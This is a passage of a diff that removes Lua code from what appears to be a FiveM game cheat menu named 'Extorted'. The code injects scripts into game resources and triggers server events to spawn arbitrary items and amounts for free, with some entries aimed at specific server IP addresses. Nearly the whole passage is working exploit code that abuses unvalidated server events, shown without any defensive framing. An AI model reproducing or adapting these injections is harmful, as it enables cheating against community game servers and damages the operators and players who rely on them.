-                                    TriggerServerEvent("apex_peckerwood:client:addItem", "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["apex_thetown"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent("apex_thetown:client:addItem", "%s", %d)
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["codewave-bbq"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    for i = 1, %d do
-                                        TriggerServerEvent('placeProp:returnItem', "%s")
-                                        Wait(1)
-                                    end
-                                ]], ItemAmount, ItemName))
-                            end,
-
-                            ["brutal_hunting"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    Wait(1)
-                                    TriggerServerEvent("brutal_hunting:server:AddItem", {
-                                        {
-                                            amount = %d,
-                                            item = "%s",
-                                            label = "Rain",
-                                            price = 0
-                                        }
-                                    })
-                                ]], ItemAmount, ItemName))
-                            end,
-
-                            ["xmmx_bahamas"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    TriggerServerEvent("xmmx-bahamas:Making:GetItem", "%s", {
-                                        amount = %d,
-                                        cash = { }
-                                    })
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["xmmx_letscookplus_v2"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    Wait(1)
-                                    TriggerServerEvent('xmmx_letscookplus:server:BuyItems', {
-                                        totalCost = 0,
-                                        cart = {
-                                            {name = "%s", quantity = %d}
-                                        }
-                                    }, "bank")
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["xmmx-letscamp"] = function()
-                                local BlockedIPs = { "66.70.153.70:80" }
-                                local function IsBlockedIP(CurrentIP)
-                                    for _, ip in ipairs(BlockedIPs) do
-                                        if CurrentIP == ip then return true end
-                                    end
-                                    return false
-                                end
-                                local CurrentIP = GetCurrentServerEndpoint()
-                                if not IsBlockedIP(CurrentIP) then
-                                    local code = string.format([[ 
-                                        Wait(1)
-                                        TriggerServerEvent('xmmx-letscamp:Cooking:GetItem', '%s', {
-                                            ['%s'] = {
-                                                ['lccampherbs'] = 0,
-                                                ['lccampmeat'] = 0,
-                                                ['lccampbutta'] = 0
-                                            },
-                                            ['amount'] = %d
-                                        })
-                                    ]], ItemName, ItemName, ItemAmount)
-                                    MachoInjectResource2(3, "xmmx-letscamp", code)
-                                end
-                            end,
-
-                            ["wasabi_mining"] = function()
-                                MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                    local item = {
-                                        difficulty = { "medium", "medium" },
-                                        item = "%s",
-                                        label = "Rain",
-                                        price = { 110, 140 }
-                                    }
-                                    local index = 3
-                                    for i = 1, %d do
-                                        Wait(1)
-                                        TriggerServerEvent('wasabi_mining:mineRock', item, index)
-                                    end
-                                ]], ItemName, ItemAmount))
-                            end,
-
-                            ["apex_bahama"] = function()
-                                local ServerIP = { "89.31.216.161:30120" }
-                                local function IsAllowedIP(CurrentIP)
-                                    for _, ip in ipairs(ServerIP) do
-                                        if CurrentIP == ip then return true end
-                                    end
-                                    return false
-                                end
-                                local CurrentIP = GetCurrentServerEndpoint()
-                                if IsAllowedIP(CurrentIP) then
-                                    MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                        Wait(1)
-                                        TriggerServerEvent("apex_bahama:client:addItem", "%s", %d)
-                                    ]], ItemName, ItemAmount))
-                                end
-                            end,
-
-                            ["jg-mechanic"] = function()
-                                local ServerIP = { "91.190.154.43:30120" }
-                                local function IsAllowedIP(CurrentIP)
-                                    for _, ip in ipairs(ServerIP) do
-                                        if CurrentIP == ip then return true end
-                                    end
-                                    return false
-                                end
-                                local CurrentIP = GetCurrentServerEndpoint()
-                                if IsAllowedIP(CurrentIP) then
-                                    MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                        Wait(1)
-                                        TriggerServerEvent('jg-mechanic:server:buy-item', "%s", 0, %d, "autoexotic", 1)
-                                    ]], ItemName, ItemAmount))
-                                end
-                            end,
-
-                            ["jg-mechanic-shiesty"] = function()
-                                local ServerIP = { "191.96.152.17:30121" }
-                                local function IsAllowedIP(CurrentIP)
-                                    for _, ip in ipairs(ServerIP) do
-                                        if CurrentIP == ip then return true end
-                                    end
-                                    return false
-                                end
-                                local CurrentIP = GetCurrentServerEndpoint()
-                                if IsAllowedIP(CurrentIP) then
-                                    MachoInjectResource2(3, GetFallbackResource(), string.format([[
-                                        Wait(1)
-                                        TriggerServerEvent('jg-mechanic:server:buy-item', "%s", 0, %d, "TheCultMechShop", 1)
-                                    ]], ItemName, ItemAmount))
-                                end
-                            end,
-
-                        }
-
-                        local ranAny = RunAllActiveResourceActions(resourceActions)
-                        if not ranAny then
-                            MachoMenuNotification("[NOTIFICATION] Extorted", "No Triggers Found.")
-                        end
-
-                    else
-                        MachoMenuNotification("[NOTIFICATION] Extorted", "Invalid Item or Amount.")
-                    end
-                else
-                    MachoMenuNotification("[NOTIFICATION] Extorted", "Invalid item name!")
                 end
             end
         }
